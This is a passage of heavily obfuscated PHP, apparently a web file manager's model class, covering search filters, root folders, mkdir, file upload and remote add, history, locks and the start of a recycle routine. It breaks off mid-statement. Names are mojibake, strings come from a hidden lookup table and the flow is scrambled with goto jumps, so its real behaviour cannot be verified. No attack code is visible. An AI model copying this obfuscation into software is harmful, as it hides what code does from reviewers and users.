A™Ñ≠—ƒ¯ª; A™Ñ≠—ƒ¯ª: $a˜÷Üèá∏Ö = array(); $bÓ∞ÛàíŒø = str_replace(array($EÑ‡™ÈÁ≈À[217], $EÑ‡™ÈÁ≈À[50], $EÑ‡™ÈÁ≈À[2319]), $EÑ‡™ÈÁ≈À[33], $bÓ∞ÛàíŒø); $bÓ∞ÛàíŒø = $EÑ‡™ÈÁ≈À[2320] . str_replace($EÑ‡™ÈÁ≈À[47], $EÑ‡™ÈÁ≈À[2321], $bÓ∞ÛàíŒø); goto DƒÍ‡Ù∫‚®; f≠˘Â§›á›: } private function _parseSearchWhere($f∆ÜÑ¢Ùô¬) { goto c–ñ»„Œ«Ÿ; c–ñ»„Œ«Ÿ: $d®Ö∆ò’Çº =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E≠≈ÆïŸè‰ = array(); if (isset($f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[702]])) { $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[107]] = array($d®Ö∆ò’Çº[2325], $f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[702]]); } goto e´®îŒèºÓ; A∞ôﬁ®°™å: if (isset($f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[2183]]) && $f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[2183]]) { $BÏí¡àôŸ¿ = $f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[2183]]; $FÆ¥Ñí”áã = explode($d®Ö∆ò’Çº[50], $BÏí¡àôŸ¿); if (strlen($BÏí¡àôŸ¿) > 2 && (substr($BÏí¡àôŸ¿, 0, 1) == $d®Ö∆ò’Çº[113] && substr($BÏí¡àôŸ¿, -1) == $d®Ö∆ò’Çº[113]) || substr($BÏí¡àôŸ¿, 0, 1) == $d®Ö∆ò’Çº[55] && substr($BÏí¡àôŸ¿, -1) == $d®Ö∆ò’Çº[55]) { $BÏí¡àôŸ¿ = substr($BÏí¡àôŸ¿, 1, -1); $FÆ¥Ñí”áã = array($BÏí¡àôŸ¿); } $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[28]] = array($d®Ö∆ò’Çº[483], $d®Ö∆ò’Çº[2185] . $BÏí¡àôŸ¿ . $d®Ö∆ò’Çº[2185]); if (count($FÆ¥Ñí”áã) > 1) { $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[28]] = array(); foreach ($FÆ¥Ñí”áã as $dôùœÏ≈»ô) { if (!trim($dôùœÏ≈»ô)) { continue; } $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[28]][] = array($d®Ö∆ò’Çº[483], $d®Ö∆ò’Çº[2185] . trim($dôùœÏ≈»ô) . $d®Ö∆ò’Çº[2185]); } } } return $E≠≈ÆïŸè‰; goto C≠óÃæÛµã; e´®îŒèºÓ: if (isset($f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[703]])) { $aœÒ“ŒØÒÏ = array($d®Ö∆ò’Çº[2326], $f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[703]]); if ($E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[107]]) { $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[107]] = array($E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[107]], $aœÒ“ŒØÒÏ, $d®Ö∆ò’Çº[2327]); } else { $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[107]] = $aœÒ“ŒØÒÏ; } } if (isset($f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[2328]])) { $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[77]] = array($d®Ö∆ò’Çº[2325], $f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[2328]]); } if (isset($f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[2329]])) { $aœÒ“ŒØÒÏ = array($d®Ö∆ò’Çº[2326], $f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[2329]]); if ($E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[77]]) { $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[77]] = array($E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[77]], $aœÒ“ŒØÒÏ, $d®Ö∆ò’Çº[2327]); } else { $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[77]] = $aœÒ“ŒØÒÏ; } } goto fÌó”——áã; fÌó”——áã: if (isset($f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[535]])) { $E≠≈ÆïŸè‰[] = array($d®Ö∆ò’Çº[379] => $f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[535]], $d®Ö∆ò’Çº[378] => $f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[535]], $d®Ö∆ò’Çº[918] => $d®Ö∆ò’Çº[2187]); } if (isset($f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[372]])) { $cü¥ßÌ£√ê = $f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[372]]; if ($cü¥ßÌ£√ê == $d®Ö∆ò’Çº[76]) { $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[370]] = 1; } else { if ($cü¥ßÌ£√ê == $d®Ö∆ò’Çº[2330]) { $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[370]] = 0; } else { if ($cü¥ßÌ£√ê) { $cü¥ßÌ£√ê = is_array($cü¥ßÌ£√ê) ? $cü¥ßÌ£√ê : explode($d®Ö∆ò’Çº[47], $cü¥ßÌ£√ê); $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[372]] = array($d®Ö∆ò’Çº[384], $cü¥ßÌ£√ê); $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[370]] = 0; } } } } if (isset($f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[461]])) { $Dá™œá§ŒÈ = $this->sourceInfo($f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[461]]); $E≠≈ÆïŸè‰[$d®Ö∆ò’Çº[525]] = array($d®Ö∆ò’Çº[483], $Dá™œá§ŒÈ[$d®Ö∆ò’Çº[459]] . $f∆ÜÑ¢Ùô¬[$d®Ö∆ò’Çº[461]] . $d®Ö∆ò’Çº[484]); } goto A∞ôﬁ®°™å; C≠óÃæÛµã: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($D˘ÙÓÒÎËÉ) { $b¿…êê≤ãê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Fﬁ™ÁÍËπÑ = Model($b¿…êê≤ãê[474])->where(array($b¿…êê≤ãê[1429] => $D˘ÙÓÒÎËÉ))->find(); $f⁄áçÜ≥¨ø = $this->_mkdirRoot(SourceModel::TYPE_USER, $D˘ÙÓÒÎËÉ, $Fﬁ™ÁÍËπÑ[$b¿…êê≤ãê[28]]); $this->userDesktopAdd($f⁄áçÜ≥¨ø); return $f⁄áçÜ≥¨ø; } public function userDesktopAdd($aÊı¬¶Ü±Ï) { $bÇ Æ∫©†ﬁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B£¶ƒΩ‡‡£ = LNG($bÇ Æ∫©†ﬁ[2331]); $e…≥‡◊ç¬… = $this->mkdir($aÊı¬¶Ü±Ï, $B£¶ƒΩ‡‡£); $this->metaSet($e…≥‡◊ç¬…, $bÇ Æ∫©†ﬁ[2332], $bÇ Æ∫©†ﬁ[83]); $this->metaSet($aÊı¬¶Ü±Ï, $bÇ Æ∫©†ﬁ[2333], $e…≥‡◊ç¬…); } public function groupRootAdd($b∞»¡çä…¨) { $C∑êéÑü Ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cŒÂÀ÷œóÏ = Model($C∑êéÑü Ç[458])->where(array($C∑êéÑü Ç[2179] => $b∞»¡çä…¨))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $b∞»¡çä…¨, $cŒÂÀ÷œóÏ[$C∑êéÑü Ç[28]]); } public function systemRootPathAdd($AÔÙ∂·ÚË€) { if ($AÔÙ∂·ÚË€ != $_SERVER[Ä¿¡‡öóµŸﬂ‡][1093]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $AÔÙ∂·ÚË€); } public function userRootRemove($Cπ…ª›çäÕ) { $C≤¿ ∏‰≈§ = $this->sourceRoot(SourceModel::TYPE_USER, $Cπ…ª›çäÕ); if (!$C≤¿ ∏‰≈§) { return; } $this->remove($C≤¿ ∏‰≈§, !1); } public function groupRootRemove($fÏπ“÷¿ËÇ) { $DÇâçÙÌ©¯ = $this->sourceRoot(SourceModel::TYPE_GROUP, $fÏπ“÷¿ËÇ); if (!$DÇâçÙÌ©¯) { return; } $this->remove($DÇâçÙÌ©¯, !1); } private function _mkdirRoot($E≤Ùúÿúí”, $dáÑ›“⁄ŒÃ, $D‰Ã∏∑™‹¡) { goto dÔ¨÷é¿õÇ; dÔ¨÷é¿õÇ: $CÊ˜˘ë‘›é =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bà≥øÙàµé = array($CÊ˜˘ë‘›é[368] => 0, $CÊ˜˘ë‘›é[521] => $E≤Ùúÿúí”, $CÊ˜˘ë‘›é[522] => $dáÑ›“⁄ŒÃ, $CÊ˜˘ë‘›é[518] => 1, $CÊ˜˘ë‘›é[523] => USER_ID, $CÊ˜˘ë‘›é[524] => USER_ID, $CÊ˜˘ë‘›é[519] => $CÊ˜˘ë‘›é[33], $CÊ˜˘ë‘›é[525] => $CÊ˜˘ë‘›é[470], $CÊ˜˘ë‘›é[396] => 0, $CÊ˜˘ë‘›é[520] => 0, $CÊ˜˘ë‘›é[420] => 0, $CÊ˜˘ë‘›é[526] => $CÊ˜˘ë‘›é[33]); if ($dËã∫ÏΩ∆› = $this->where($bà≥øÙàµé)->find()) { return $dËã∫ÏΩ∆›[$CÊ˜˘ë‘›é[369]]; } goto EØÖôË‘ó¢; c©èóŒ”«π: CacheLock::unlock($E´∞ºÍ´ó◊); return $AÎÛ”ü±¥«; goto EÊŒ∞¢∫ù‘; eÖÑøΩ°Ì˜: $AÎÛ”ü±¥« = $this->add($bà≥øÙàµé); $dÑ™ËÊÒì∞ = array($CÊ˜˘ë‘›é[527] => short_id($AÎÛ”ü±¥«)); $this->where(array($CÊ˜˘ë‘›é[383] => $AÎÛ”ü±¥«))->save($dÑ™ËÊÒì∞); goto c©èóŒ”«π; EØÖôË‘ó¢: $E´∞ºÍ´ó◊ = "\x4d\x6f\x64\145\154\123\157\165\162\x63\x65\56\x6d\x6b\x64\x69\162\122\157\x6f\x74\56{$E≤Ùúÿúí”}\56{$dáÑ›“⁄ŒÃ}\x2e" . $D‰Ã∏∑™‹¡; CacheLock::lock($E´∞ºÍ´ó◊); $bà≥øÙàµé[$CÊ˜˘ë‘›é[28]] = $D‰Ã∏∑™‹¡; goto eÖÑøΩ°Ì˜; EÊŒ∞¢∫ù‘: } private function sourceRoot($fõü≈Ωè∑¨, $cÁ∆√™Ê±ã, $B≈»ﬁ⁄ﬁ∞§ = false) { $dŸ¶‡å§Ü˜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aìÚﬂÙå˜Ö = array($dŸ¶‡å§Ü˜[368] => 0, $dŸ¶‡å§Ü˜[521] => $fõü≈Ωè∑¨, $dŸ¶‡å§Ü˜[522] => $cÁ∆√™Ê±ã); if ($d£ÈŸ¶èå = $this->where($aìÚﬂÙå˜Ö)->find()) { return $B≈»ﬁ⁄ﬁ∞§ ? $d£ÈŸ¶èå : $d£ÈŸ¶èå[$dŸ¶‡å§Ü˜[369]]; } return !1; } public function sourceRootGroup($FèàÍøÊﬁÈ) { $DÎŒıèô≠” =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_string($FèàÍøÊﬁÈ)) { $FèàÍøÊﬁÈ = array($FèàÍøÊﬁÈ); } $b∞§¶êÒ®ú = array($DÎŒıèô≠”[368] => 0, $DÎŒıèô≠”[521] => SourceModel::TYPE_GROUP, $DÎŒıèô≠”[522] => array($DÎŒıèô≠”[7], $FèàÍøÊﬁÈ)); $c≠√êäŒíπ = $this->listSource($b∞§¶êÒ®ú, 1000); return array_to_keyvalue($c≠√êäŒíπ[$DÎŒıèô≠”[74]], $DÎŒıèô≠”[456]); } public function mkfile($e©Ü€†ø¥£, $CçæÕÛÑ∂Á, $E™∫èàéë‡ = '', $C’ÃáîÓº = REPEAT_RENAME) { $CŸäÎÊ÷øª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CÿçÂ∂“ìû = Model($CŸäÎÊ÷øª[544])->addFileByContent($E™∫èàéë‡, $CçæÕÛÑ∂Á); return $this->_createFileCall($e©Ü€†ø¥£, $CçæÕÛÑ∂Á, $CÿçÂ∂“ìû, $C’ÃáîÓº, $CŸäÎÊ÷øª[1129]); } public function addFile($d‡ıÀâ£åÇ, $e¬”¯Ê≈⁄‡, $A›Ü≤ ã », $cÉº«◊òä„ = false, $AÈÀåä¢ÏÂ = REPEAT_RENAME) { $E∫ÚëöõàÁ = Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][544])->addFile($e¬”¯Ê≈⁄‡, $A›Ü≤ ã », $cÉº«◊òä„); return $this->_createFileCall($d‡ıÀâ£åÇ, $A›Ü≤ ã », $E∫ÚëöõàÁ, $AÈÀåä¢ÏÂ); } public function addFileByFileID($BÆ≤¿Ωã®‡, $bŒë©ÇÂ¡◊, $eÙ‡¡≤öáÑ, $c¥ÇﬁµÕ‡∞ = REPEAT_RENAME) { $a Òßï∏Ì∂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÍ‹¶ÑÚÚÛ = Model($a Òßï∏Ì∂[544])->find($bŒë©ÇÂ¡◊); Model($a Òßï∏Ì∂[544])->linkAdd($bŒë©ÇÂ¡◊); return $this->_createFileCall($BÆ≤¿Ωã®‡, $eÙ‡¡≤öáÑ, $dÍ‹¶ÑÚÚÛ, $c¥ÇﬁµÕ‡∞); } public function addFileByRemote($dÁ˜¥®Ñ®Ω, $däûÛ·∞Ëï, $d∆≤¢Ìò¯ô, $c©∫≠êçâ° = array(), $CïÌÉç£Ú” = REPEAT_RENAME) { $fä®ç€Ÿ€∏ = Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][544])->addFileByRemote($däûÛ·∞Ëï, $d∆≤¢Ìò¯ô, $c©∫≠êçâ°); return $this->_createFileCall($dÁ˜¥®Ñ®Ω, $d∆≤¢Ìò¯ô, $fä®ç€Ÿ€∏, $CïÌÉç£Ú”); } private function _createFileCall($aíã£ôçıø, $càêÖÒº≥ª, $Dç±‰åµªΩ, $Cï¨≥’ê´ë, $eµ€é¡¥°á = "\x75\x70\x6c\x6f\x61\x64") { goto Fÿ…•âÉﬂ˜; E™ïàÎË‘à: $e›ñâ≥Èÿµ = $this->_createFile($aíã£ôçıø, $càêÖÒº≥ª, $Dç±‰åµªΩ, $Cï¨≥’ê´ë, $fã¿Ù≤∆‚π); if (!$fã¿Ù≤∆‚π) { Model($bﬂ≠œƒﬂ◊á[422])->remove($Dç±‰åµªΩ[$bﬂ≠œƒﬂ◊á[419]]); } else { if ($e›ñâ≥Èÿµ) { Model($bﬂ≠œƒﬂ◊á[2304])->eventCreate($e›ñâ≥Èÿµ, $eµ€é¡¥°á); } } $this->lockWriteEnd($aíã£ôçıø, $càêÖÒº≥ª); goto EÃôœíΩáÈ; Fÿ…•âÉﬂ˜: $bﬂ≠œƒﬂ◊á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fã¿Ù≤∆‚π = !1; $this->lockWriteStart($aíã£ôçıø, $càêÖÒº≥ª); goto E™ïàÎË‘à; EÃôœíΩáÈ: return $e›ñâ≥Èÿµ; goto fÚ•Ò‰ıïÕ; fÚ•Ò‰ıïÕ: } public function mkdir($bπ¬´¡ø≤Û, $c“ÙÌ¶ªˆ˜, $Cêœ√®Áé› = REPEAT_SKIP) { goto A‰º√í˜ü⁄; eøÉä‰≠’⁄: $bí©ÕØÉú£ = $this->_addSoure($C≠åÀçûí¿, $D©è›∞Ω¢à); Model($eÇ®≥ãË¨≠[2304])->eventCreate($bí©ÕØÉú£, $eÇ®≥ãË¨≠[1130]); $this->lockWriteEnd($bπ¬´¡ø≤Û, $c“ÙÌ¶ªˆ˜); goto aπà∂áã¨¨; aπà∂áã¨¨: return $bí©ÕØÉú£; goto D∏Ω—ÿçπÑ; A‰º√í˜ü⁄: $eÇ®≥ãË¨≠ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D©è›∞Ω¢à = $this->sourceInfo($bπ¬´¡ø≤Û); if (!$D©è›∞Ω¢à) { return !1; } goto d⁄ïéÔè≥Ã; d⁄ïéÔè≥Ã: $this->lockWriteStart($bπ¬´¡ø≤Û, $c“ÙÌ¶ªˆ˜); if ($Cêœ√®Áé› !== !1) { $Búÿá®ÿØ≤ = $this->fileNameExist($bπ¬´¡ø≤Û, $c“ÙÌ¶ªˆ˜); if ($Búÿá®ÿØ≤ && $Cêœ√®Áé› != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($bπ¬´¡ø≤Û, $c“ÙÌ¶ªˆ˜); return $Búÿá®ÿØ≤; } $c“ÙÌ¶ªˆ˜ = $this->fileNameAuto($bπ¬´¡ø≤Û, $c“ÙÌ¶ªˆ˜, $Cêœ√®Áé›); } $C≠åÀçûí¿ = array($eÇ®≥ãË¨≠[518] => 1, $eÇ®≥ãË¨≠[386] => $c“ÙÌ¶ªˆ˜, $eÇ®≥ãË¨≠[519] => $eÇ®≥ãË¨≠[33], $eÇ®≥ãË¨≠[420] => 0, $eÇ®≥ãË¨≠[520] => 0); goto eøÉä‰≠’⁄; D∏Ω—ÿçπÑ: } private function _createFile($e˘Ôö±ôﬂÌ, $c’Ééƒãƒß, $cÙõ™∫Îñò, $BÎÛ∞áØëû, &$aü©°øΩ™Õ) { goto aıéáÆ»àÍ; Fó¶∑øÌŸ≈: if ($BÎÛ∞áØëû !== !1) { $eäËΩØ∏ΩÓ = $this->fileNameExist($e˘Ôö±ôﬂÌ, $c’Ééƒãƒß); } $aü©°øΩ™Õ = !0; if ($BÎÛ∞áØëû && $eäËΩØ∏ΩÓ) { if ($BÎÛ∞áØëû == REPEAT_SKIP) { $aü©°øΩ™Õ = !1; return $eäËΩØ∏ΩÓ; } else { if ($BÎÛ∞áØëû == REPEAT_REPLACE) { $cÛ∫à©‚¨Õ = $this->sourceInfo($eäËΩØ∏ΩÓ); $eóÎãÓ‚ÇÓ = $this->fileHistory($cÛ∫à©‚¨Õ, $cÙõ™∫Îñò[$eá ¯üí£‡[419]], $cÙõ™∫Îñò[$eá ¯üí£‡[77]]); if (!$eóÎãÓ‚ÇÓ) { $aü©°øΩ™Õ = !1; } else { $this->folderSizeReset($e˘Ôö±ôﬂÌ); } return $eäËΩØ∏ΩÓ; } else { $c’Ééƒãƒß = $this->fileNameAuto($e˘Ôö±ôﬂÌ, $c’Ééƒãƒß, $BÎÛ∞áØëû, !1); } } } goto AÍÔëÌÑ‚õ; AÍÔëÌÑ‚õ: $a‰ΩÑ¿»ΩÕ = array($eá ¯üí£‡[518] => 0, $eá ¯üí£‡[386] => $c’Ééƒãƒß, $eá ¯üí£‡[519] => get_path_ext($c’Ééƒãƒß), $eá ¯üí£‡[420] => $cÙõ™∫Îñò[$eá ¯üí£‡[419]], $eá ¯üí£‡[520] => $cÙõ™∫Îñò[$eá ¯üí£‡[77]]); $d∑Ì†Ü‹€à = $this->_addSoure($a‰ΩÑ¿»ΩÕ, $f¡ÿØÜö≥∞); $this->folderSizeReset($e˘Ôö±ôﬂÌ); goto e‹¶È„‰‚; aıéáÆ»àÍ: $eá ¯üí£‡ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f¡ÿØÜö≥∞ = $this->sourceInfo($e˘Ôö±ôﬂÌ); if (!$cÙõ™∫Îñò || !$f¡ÿØÜö≥∞) { return !1; } goto Fó¶∑øÌŸ≈; e‹¶È„‰‚: return $d∑Ì†Ü‹€à; goto Aã—ËÛá…ê; Aã—ËÛá…ê: } protected function fileHistory($e∂ôƒŸ˘—≤, $dﬂø‹Çê•∫, $b€è‘—ØÏ∑) { goto cÔã÷ê´∆≤; cÔã÷ê´∆≤: $eò¥ìß¯¡∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($e∂ôƒŸ˘—≤[$eò¥ìß¯¡∆[419]] == $dﬂø‹Çê•∫) { return !1; } $this->checkLock($e∂ôƒŸ˘—≤[$eò¥ìß¯¡∆[369]], $dﬂø‹Çê•∫); goto BâÍ◊Ñ¯ª¯; d·È†Œˆã°: return !0; goto FÜ‚ˆúï÷∞; BâÍ◊Ñ¯ª¯: Model($eò¥ìß¯¡∆[2334])->addHistory($e∂ôƒŸ˘—≤); $BËÍÀìÍûÃ = array($eò¥ìß¯¡∆[524] => USER_ID, $eò¥ìß¯¡∆[390] => time(), $eò¥ìß¯¡∆[419] => $dﬂø‹Çê•∫, $eò¥ìß¯¡∆[77] => $b€è‘—ØÏ∑); $this->where(array($eò¥ìß¯¡∆[383] => $e∂ôƒŸ˘—≤[$eò¥ìß¯¡∆[369]]))->save($BËÍÀìÍûÃ); goto d·È†Œˆã°; FÜ‚ˆúï÷∞: } public function checkLock($a©¬√ËÁÌÉ, $bóŸ˘æˆºï) { goto F˘©°Œ∑‰à; Dû˘¿ô≠íÖ: $this->_createFileCall($d€ﬁá™„ºã[$fÖ¢”ü†πö[461]], $f’àÁ„’ÊÈ, $A°ºáñÛÁ§, REPEAT_REPLACE, $fÖ¢”ü†πö[1129]); $bÊ≤÷êÊê£ = $d€ﬁá™„ºã[$fÖ¢”ü†πö[417]][$fÖ¢”ü†πö[481]]; $a—ºÇç–Î¥ = $bÊ≤÷êÊê£[$fÖ¢”ü†πö[2336]] ? $bÊ≤÷êÊê£[$fÖ¢”ü†πö[2336]] : $bÊ≤÷êÊê£[$fÖ¢”ü†πö[28]]; goto f˘Ü‡’õãÃ; F˘©°Œ∑‰à: $fÖ¢”ü†πö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d€ﬁá™„ºã = $this->pathInfo($a©¬√ËÁÌÉ); if (!$this->fileIsLock($d€ﬁá™„ºã, !0)) { return; } goto fÖ–´µ§èÜ; fÖ–´µ§èÜ: $b‘Øñ”¢–Ü = Session::get($fÖ¢”ü†πö[2335]); $f’àÁ„’ÊÈ = substr($d€ﬁá™„ºã[$fÖ¢”ü†πö[28]], 0, -1 - strlen($d€ﬁá™„ºã[$fÖ¢”ü†πö[160]])) . $fÖ¢”ü†πö[1391] . $b‘Øñ”¢–Ü . $fÖ¢”ü†πö[91] . $d€ﬁá™„ºã[$fÖ¢”ü†πö[160]]; $A°ºáñÛÁ§ = Model($fÖ¢”ü†πö[544])->find($bóŸ˘æˆºï); goto Dû˘¿ô≠íÖ; f˘Ü‡’õãÃ: show_json(LNG($fÖ¢”ü†πö[2337]) . $fÖ¢”ü†πö[2338] . LNG($fÖ¢”ü†πö[2339]) . $fÖ¢”ü†πö[2340] . $a—ºÇç–Î¥ . $fÖ¢”ü†πö[2341], !1); goto cÇ°ÛÏ«Ö; cÇ°ÛÏ«Ö: } public function fileIsLock($a€ÖﬁÚóÉô, $F∑ŒËç÷ˆ’ = false) { goto e≈¢Ûª±ˆ; bÑ√≈æıÃ√: return !1; goto c¶ÖµçÖ∫Ê; e≈¢Ûª±ˆ: $CŸÜ¯‡à±Ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset($a€ÖﬁÚóÉô[$CŸÜ¯‡à±Ÿ[417]]) || !$a€ÖﬁÚóÉô[$CŸÜ¯‡à±Ÿ[417]][$CŸÜ¯‡à±Ÿ[478]]) { return !1; } if ($a€ÖﬁÚóÉô[$CŸÜ¯‡à±Ÿ[417]][$CŸÜ¯‡à±Ÿ[478]] != USER_ID) { return !0; } goto f¨ç˜çÿπ£; f¨ç˜çÿπ£: $aµ¢øì£ΩÖ = $GLOBALS[$CŸÜ¯‡à±Ÿ[6]][$CŸÜ¯‡à±Ÿ[84]][$CŸÜ¯‡à±Ÿ[479]]; if ($a€ÖﬁÚóÉô[$CŸÜ¯‡à±Ÿ[417]][$CŸÜ¯‡à±Ÿ[480]] <= time() - $aµ¢øì£ΩÖ) { $this->metaSet($a€ÖﬁÚóÉô[$CŸÜ¯‡à±Ÿ[369]], $CŸÜ¯‡à±Ÿ[478], null); $this->metaSet($a€ÖﬁÚóÉô[$CŸÜ¯‡à±Ÿ[369]], $CŸÜ¯‡à±Ÿ[480], null); } if ($F∑ŒËç÷ˆ’) { $this->metaSet($a€ÖﬁÚóÉô[$CŸÜ¯‡à±Ÿ[369]], $CŸÜ¯‡à±Ÿ[480], time()); } goto bÑ√≈æıÃ√; c¶ÖµçÖ∫Ê: } private function _addSoure($FçÉ∂íÖÎî, $e¿‡≥ÔËÍà) { goto cÒ¥€∑èÏç; Aõò∑ıÛÀ≈: $BÕ›‡∂Òåí = array($E¡Ò‚≤Ò√ô[527] => short_id($AÀ™Êô¨‡ä)); $this->where(array($E¡Ò‚≤Ò√ô[383] => $AÀ™Êô¨‡ä))->save($BÕ›‡∂Òåí); $this->setNamePinyin($AÀ™Êô¨‡ä, $FçÉ∂íÖÎî[$E¡Ò‚≤Ò√ô[28]]); goto C¨ÙË©ı’‰; bôÙà‘¥ëÑ: static $A¨ú…Ö·Œç = false; if (!$A¨ú…Ö·Œç) { Hook::trigger($E¡Ò‚≤Ò√ô[508], $FçÉ∂íÖÎî); $A¨ú…Ö·Œç = !0; } $AÀ™Êô¨‡ä = $this->add($FçÉ∂íÖÎî); goto Aõò∑ıÛÀ≈; cÒ¥€∑èÏç: $E¡Ò‚≤Ò√ô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eéá¡ÑÎÉ¥ = array($E¡Ò‚≤Ò√ô[521] => $e¿‡≥ÔËÍà[$E¡Ò‚≤Ò√ô[371]], $E¡Ò‚≤Ò√ô[522] => $e¿‡≥ÔËÍà[$E¡Ò‚≤Ò√ô[456]], $E¡Ò‚≤Ò√ô[523] => USER_ID, $E¡Ò‚≤Ò√ô[524] => USER_ID, $E¡Ò‚≤Ò√ô[368] => $e¿‡≥ÔËÍà[$E¡Ò‚≤Ò√ô[369]], $E¡Ò‚≤Ò√ô[525] => $e¿‡≥ÔËÍà[$E¡Ò‚≤Ò√ô[459]] . $e¿‡≥ÔËÍà[$E¡Ò‚≤Ò√ô[369]] . $E¡Ò‚≤Ò√ô[47], $E¡Ò‚≤Ò√ô[396] => 0, $E¡Ò‚≤Ò√ô[526] => $E¡Ò‚≤Ò√ô[33]); $FçÉ∂íÖÎî = array_merge($eéá¡ÑÎÉ¥, $FçÉ∂íÖÎî); goto cÑØ∑ÈÔ¯Œ; C¨ÙË©ı’‰: return $AÀ™Êô¨‡ä; goto C‹¯∂îÁ£¬; cÑØ∑ÈÔ¯Œ: $this->updateModifyTime($FçÉ∂íÖÎî[$E¡Ò‚≤Ò√ô[461]]); $B»˘ŒÇœ¿™ = $E¡Ò‚≤Ò√ô[2342] . $e¿‡≥ÔËÍà[$E¡Ò‚≤Ò√ô[369]]; if (isset(self::$cacheChildList[$B»˘ŒÇœ¿™])) { unset(self::$cacheChildList[$B»˘ŒÇœ¿™]); } goto bôÙà‘¥ëÑ; C‹¯∂îÁ£¬: } public function remove($Döœ„°àà§, $Bô·∞ΩÆª◊ = true) { goto Fè»ò≤≈≤¶; dõﬁ‡Ëª†˘: CacheLock::lock($eÃ•‘∑¡Üõ); $c≠âÆ¯º≈Í = $this->fileNameExist($Bæ⁄£Ω≈É˜, $fƒ€€â§ï„); if (!$c≠âÆ¯º≈Í) { $c≠âÆ¯º≈Í = $this->mkdir($Bæ⁄£Ω≈É˜, $fƒ€€â§ï„, REPEAT_SKIP); $this->metaSet($c≠âÆ¯º≈Í, $Eú¢ÃÑôãƒ[2347], $BÇ˜ﬁõÔ»ã); $this->metaSet($c≠âÆ¯º≈Í, $Eú¢ÃÑôãƒ[2348], $A‚‚èú“âØ[$Eú¢ÃÑôãƒ[456]]); if ($A‚‚èú“âØ[$Eú¢ÃÑôãƒ[461]] != 0) { $this->metaSet($c≠âÆ¯º≈Í, $Eú¢ÃÑôãƒ[2349], _get($F¬æ≤⁄Óà•, $Eú¢ÃÑôãƒ[2350])); } } goto A”®§à≈•Õ; D¢òøÆÀﬁÀ: $b∑ÇôòëØæ = Model($Eú¢ÃÑôãƒ[1436])->get($Eú¢ÃÑôãƒ[2343]) == $Eú¢ÃÑôãƒ[83]; if ($AñˆÎô⁄ç∆ || $Bô·∞ΩÆª◊ || !$b∑ÇôòëØæ) { return $this->removeNow($Döœ„°àà§, $Bô·∞ΩÆª◊); } $Bæ⁄£Ω≈É˜ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto f¬Ïùÿµè«; fú◊Ó´ÍÊ∞: return $e√ƒàÇˆòç; goto Aéü∆ëª©‰; A”®§à≈•Õ: CacheLock::unlock($eÃ•‘∑¡Üõ); $this->metaSet($Döœ„°àà§, $Eú¢ÃÑôãƒ[2351], $A‚‚èú“âØ[$Eú¢ÃÑôãƒ[461]]); $this->where(array($Eú¢ÃÑôãƒ[369] => $Döœ„°àà§))->save(array($Eú¢ÃÑôãƒ[390] => time())); goto Bà‰›ÿ´çÓ; f¬Ïùÿµè«: $BÇ˜ﬁõÔ»ã = $A‚‚èú“âØ[$Eú¢ÃÑôãƒ[371]] == self::TYPE_USER ? $Eú¢ÃÑôãƒ[535] : $Eú¢ÃÑôãƒ[975]; if ($BÇ˜ﬁõÔ»ã == $Eú¢ÃÑôãƒ[535]) { $F¬æ≤⁄Óà• = 